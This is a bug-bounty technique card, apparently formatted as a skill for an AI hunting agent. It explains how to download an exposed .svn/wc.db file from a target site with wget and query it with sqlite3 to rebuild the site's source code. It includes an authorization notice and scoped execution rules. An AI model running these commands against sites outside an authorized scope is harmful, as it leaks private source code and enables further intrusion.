# SKILL: .svn/wc.db exposed → full source code reconstruction (\$400 case)

**Skill id:** `tip/svnwcdb-exposed-full-source-code-reconstruction-400-case`  
**Category:** Recon  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/401dac31e880817fadbcdc322942ef4d  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **Recon**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

جرب /.svn/wc.db. لو موجود، حمله واستخدم sqlite3 عشان تستخرج الـ pristine paths وتبني الـ source كامل (زي .git).

## Payload / Code

```
wget [https://target.com/.svn/wc.db](https://target.com/.svn/wc.db)
sqlite3 wc.db 'select local\_relpath from NODES;'
```

## Source

Vipul Sahu Medium writeup (\$400)

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
